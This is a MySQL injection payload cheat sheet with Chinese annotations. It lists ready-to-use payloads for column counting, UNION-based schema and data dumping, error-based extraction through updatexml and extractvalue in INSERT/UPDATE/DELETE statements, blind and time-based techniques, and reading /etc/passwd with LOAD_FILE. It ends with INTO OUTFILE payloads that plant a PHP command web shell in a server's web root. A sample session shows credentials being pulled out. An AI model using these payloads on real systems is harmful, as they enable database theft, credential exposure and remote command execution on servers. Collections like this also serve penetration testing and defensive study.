# MYSQL Injection

## Detect columns number
Using a simple ORDER
```
order by 1
order by 2
order by 3
...
order by XXX
```

## MySQL Union Based
```
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name=...
UniOn Select 1,2,3,4,...,gRoUp_cOncaT(0x7c,data,0x7C)+fRoM+...
```

## MySQL Error Based - Basic
```
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))+'
```

## MYSQL Error Based - UpdateXML function(有长度限制,最长32位)
```
因为我们这里是用的显错模式，所以思路就是在insert、update、delete语句中人为构造语法错误，利用如下语句：
INSERT INTO users (id, username, password) VALUES (2,''inject here'','Olivia');
INSERT INTO users (id, username, password) VALUES (2,""inject here"",'Olivia');
注意：大家看到本来是要填入username字段的地方，我们填了'inject here'和”inject here”两个字段来实现爆错，一个是单引号包含、一个是双引号包含，要根据实际的注入点灵活构造。
INSERT INTO users(id,username,password)VALUES(3,'kali' AND updatexml(1,concat(0x7e,@@version),0),'pass');

UPDATE users SET password='Nicky' OR updatexml(2,concat(0x7e,(version())),0) or''WHERE id=2 and username='Olivia';
获取版本号
DELETE FROM users WHERE id=2 or updatexml(1,concat(0x7e,(version())),0) or'';
获取版本号
AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)-
获取数据库名
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
获取表名
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
获取列名
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--

获取信息data_info为列名data_table.data_column表名
AND updatexml(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--

update 表名1 set username='test' or updatexml(1,concat(0x70,(select concat_ws(':',username,password) from 表名2.列名 limit 0,1)),0) where id =1;
我们可以用insert、update、delete语句获取到数据库表名、列名，但是不能用update获取当前表的数据：
```

## MYSQL Error Based - Extractvalue function(有长度限制,最长32位)
```
MariaDB [updatexml]> insert into users(id,username,password) values (1,'kali' or extractvalue(1,concat(0x7e,(select concat_ws(':',username,password) from users limit 0,1))),'test');
ERROR 1105 (HY000): XPATH syntax error: '~root:toor'

MariaDB [updatexml]> insert into users(id,username,password) values (1,'kali' or extractvalue(1,concat(0x7e,(select concat(username,password) from users limit 0,1))),'test');
ERROR 1105 (HY000): XPATH syntax error: '~roottoor'

MariaDB [updatexml]> update users set username='root' or extractvalue(1,concat(0x7e,(select concat(username) from users limit 0,1))) where id =1;
ERROR 1105 (HY000): XPATH syntax error: '~root'

MariaDB [updatexml]> delete from users where id =1 or extractvalue(1,concat(0x7e,(select concat(username) from users limit 0,1)));ERROR 1105 (HY000): XPATH syntax error: '~root'

AND extractvalue(rand(),concat(CHAR(126),version(),CHAR(126)))--

AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--

AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--

AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--

AND extractvalue(rand(),concat(0x3a,(SELECT concat(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)))--
同样，我们可以用insert、update、delete语句获取到数据库表名、列名，但是不能用update获取当前表的数据。
```

## 子查询
```
Insert：
INSERT INTO users (id, username, password) VALUES (1,'Olivia' 

or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)

, 'Nervo');

update：
UPDATE users SET password='Nicky' or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' WHERE id=2 and username='Nervo';
delete：
DELETE FROM users WHERE id=1 or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' ;

提取数据：

获取newdb数据库表名：
INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT distinct concat(0x7e,0x27,cast(table_name as char),0x27,0x7e) FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '','Nervo');
enter image description here

获取users表的列名：
INSERT INTO users (id, username, password) VALUES (1, 'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT distinct concat(0x7e,0x27,cast(column_name as char),0x27,0x7e) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' LIMIT 0,1)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo');

获取users表的数据：

INSERT INTO users (id, username, password) VALUES (1, 'Olivia' or (SELECT 1 FROM(SELECT count(*),concat((SELECT (SELECT (SELECT concat(0x7e,0x27,cast(users.username as char),0x27,0x7e) FROM `newdb`.users LIMIT 0,1) ) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo');

更多闭合变种
' or (payload) or '
' and (payload) and '
' or (payload) and '
' or (payload) and '='
'* (payload) *'
' or (payload) and '
" – (payload) – "
```

## MYSQL delete：

DELETE FROM users WHERE id=1 or (SELECT 1 FROM(SELECT count(*),concat((SELECT(SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a)or'' ;Blind with MAKE_SET
```
AND MAKE_SET(YOLO<(SELECT(length(version()))),1)
AND MAKE_SET(YOLO<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(YOLO<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(YOLO<ascii(substring(concat(login,password),POS,1)),1)
```

## MYSQL Time Based
```
+BENCHMARK(40000000,SHA1(1337))+
'%2Bbenchmark(3200,SHA1(1))%2B'
' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```


## MYSQL Read content of a file
```
' UNION ALL SELECT LOAD_FILE('/etc/passwd') --
```

## MySQL DIOS - Dump in One Shot
```
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
```

## MYSQL DROP SHELL
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
-1 UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
```
